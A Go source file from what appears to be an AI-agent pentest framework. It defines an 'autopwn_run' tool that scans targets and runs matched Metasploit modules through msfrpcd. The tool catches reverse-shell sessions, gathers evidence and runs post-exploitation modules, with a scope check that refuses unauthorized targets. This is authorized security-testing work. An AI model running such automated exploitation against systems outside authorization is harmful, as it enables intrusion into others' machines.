package server

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/Autumn-27/artex/agent"
	"github.com/Autumn-27/artex/autopwn"
	"github.com/Autumn-27/artex/db"
	"github.com/Autumn-27/artex/msfrpc"
	actool "github.com/Autumn-27/norma/tool"
)

// autopwnSchema is shared by the tool and its docs.
func autopwnSchema() map[string]any {
	return map[string]any{
		"type": "object",
		"properties": map[string]any{
			"targets": map[string]any{
				"type": "array", "items": map[string]any{"type": "string"},
				"description": "目标 IP/域名列表（每个都必须在任务授权 scope 内，越界目标直接拒绝）",
			},
			"ports":        map[string]any{"type": "string", "description": "扫描端口，如 21,22,80 或 1-1024,8080（默认内置常见端口）"},
			"lhost":        map[string]any{"type": "string", "description": "反弹回连地址（默认自动探测本机出口 IP）"},
			"lport":        map[string]any{"type": "integer", "description": "反弹回连端口，默认 4444"},
			"max_exploits": map[string]any{"type": "integer", "description": "每个目标最多尝试几个候选，默认 3（上限 8）"},
			"wait_seconds": map[string]any{"type": "integer", "description": "每次尝试等待会话的秒数，默认 25（上限 120）"},
			"post":         map[string]any{"type": "boolean", "description": "拿到会话后是否自动跑后渗透模块，默认 true"},
			"dry_run":      map[string]any{"type": "boolean", "description": "只扫描与规划，不执行任何模块"},
			"rpc_password": map[string]any{"type": "string", "description": "msfrpcd 密码（缺省读 ARTEX_MSF_RPC_PASSWORD / 设置项 msf_rpc_password）"},
			"rpc_ssl": map[string]any{"type": "string", "enum": []any{"auto", "true", "false"},
				"description": "msfrpcd 是否 TLS：auto=两种都试"},
		},
		"required": []any{"targets"},
	}
}

// autopwnTool is the fully automated loop as a worker tool: it plans from real
// scan results (not from a model guess), executes candidates in confidence
// order, collects session evidence, and optionally runs post modules.
func (s *Server) autopwnTool() actool.CoreTool {
	return actool.Build(actool.Spec{
		Name: "autopwn_run",
		Description: "【全自动利用闭环】给一批授权目标，自动完成：端口扫描 → 服务/版本识别（含 banner）→ 用 msf 决策层匹配候选模块 → " +
			"按置信度逐个在 msfrpcd console 上执行 → 轮询新会话 → 自动取证（whoami/hostname）→ 可选后渗透模块。全程无 MCP、无 Python 依赖。" +
			"目标必须在任务 scope 内（越界直接拒绝）；只在已完成侦察、确有授权时使用。返回逐目标 evidence、attempts、sessions、post 结果，可直接写报告。",
		Schema:      autopwnSchema(),
		ReadOnly:    func(json.RawMessage) bool { return false },
		Permissions: allowAll,
		Run: func(ctx context.Context, in json.RawMessage, _ *actool.ToolContext) (actool.Result, error) {
			var a struct {
				Targets  []string `json:"targets"`
				Ports    string   `json:"ports"`
				LHOST    string   `json:"lhost"`
				LPORT    int      `json:"lport"`
				MaxExpl  int      `json:"max_exploits"`
				WaitSecs int      `json:"wait_seconds"`
				Post     *bool    `json:"post"`
				DryRun   bool     `json:"dry_run"`
				RPCPass  string   `json:"rpc_password"`
				RPCSsl   string   `json:"rpc_ssl"`
			}
			_ = json.Unmarshal(in, &a)

			targets := make([]string, 0, len(a.Targets))
			for _, t := range a.Targets {
				if t = strings.TrimSpace(t); t != "" {
					targets = append(targets, t)
				}
			}
			if len(targets) == 0 {
				return actool.Errorf("targets 不能为空"), nil
			}

			// Scope 是硬闸门：autopwn 会在一批目标上连续动作，越界目标不能"先跑再看"。
			var refused []string
			for _, t := range targets {
				if ok, why := s.msfScopeAllows(ctx, t); !ok {
					refused = append(refused, fmt.Sprintf("%s（%s）", t, why))
				}
			}
			if len(refused) > 0 {
				return actool.Errorf("拒绝执行：以下目标不在任务授权 scope 内 —— " + strings.Join(refused, "; ")), nil
			}

			ports, err := autopwn.ParsePorts(a.Ports)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			pw := a.RPCPass
			if pw == "" {
				pw = os.Getenv("ARTEX_MSF_RPC_PASSWORD")
			}
			if pw == "" && s.m != nil && s.m.pg != nil {
				pw, _, _ = s.m.pg.GetSetting("msf_rpc_password")
			}
			if pw == "" && s.msfRPC != nil {
				pw = s.msfRPC.Password()
			}
			sslMode := a.RPCSsl
			if sslMode == "" {
				sslMode = os.Getenv("ARTEX_MSF_RPC_SSL")
			}
			sess, err := s.msfConnect(ctx, pw, sslMode)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			defer sess.Close()

			lhost := strings.TrimSpace(a.LHOST)
			if lhost == "" {
				lhost = autopwn.DetectLHOST(targets[0])
			}
			post := true
			if a.Post != nil {
				post = *a.Post
			}
			engine := autopwn.New(sess.client, autopwn.Options{
				Targets: targets, Ports: ports, LHOST: lhost, LPORT: a.LPORT,
				MaxExploits: a.MaxExpl, WaitSession: time.Duration(a.WaitSecs) * time.Second,
				Post: post, Evidence: true, DryRun: a.DryRun,
				Log: func(format string, args ...any) { logAutopwn(format, args...) },
			})
			sum := engine.Run(ctx)
			s.autopwnRecordFact(ctx, sum)
			return jsonResult(map[string]any{
				"summary":  sum,
				"sessions": sum.Sessions(),
				"note":     "拿到会话即已取证；把 sessions[].evidence 与 attempts[].output 写进 finding 证据，未拿到的按 attempts 记录失败原因。",
			})
		},
	})
}

func logAutopwn(format string, args ...any) {
	// Keep the server log readable: autopwn already returns a full transcript.
	fmt.Printf("[autopwn] "+format+"\n", args...)
}

// autopwnRecordFact writes one confirmed fact per run so the exploration graph
// (and the next planner round) sees which targets were exploited.
func (s *Server) autopwnRecordFact(ctx context.Context, sum *autopwn.Summary) {
	if s.m == nil || s.m.pg == nil || sum == nil {
		return
	}
	ri := agent.RunInfoFrom(ctx)
	if ri.TaskID <= 0 {
		return
	}
	task, ok := s.m.Task(fmt.Sprintf("%d", ri.TaskID))
	if !ok || task == nil || task.Store == nil {
		return
	}
	for _, r := range sum.Results {
		if len(r.Sessions) == 0 {
			continue
		}
		var ids, evidence []string
		for _, s := range r.Sessions {
			ids = append(ids, s.ID)
			if s.Evidence != "" {
				evidence = append(evidence, fmt.Sprintf("#%s %s: %s", s.ID, s.Type, s.Evidence))
			}
		}
		payload := map[string]any{
			"summary":        fmt.Sprintf("autopwn 拿到会话：%s（session %s）", r.Target, strings.Join(ids, ",")),
			"evidence":       strings.Join(evidence, "\n"),
			"confidence":     "confirmed",
			"autopwn_target": r.Target,
			"session_ids":    ids,
		}
		if _, err := task.Store.AddNode(db.KindFact, payload, 0, "confirmed", "worker", nil); err != nil {
			fmt.Printf("[autopwn] 写回 fact 失败：%v\n", err)
		}
	}
}

// ensure the concrete client keeps satisfying autopwn's interface.
var _ autopwn.MSF = (*msfrpc.Client)(nil)
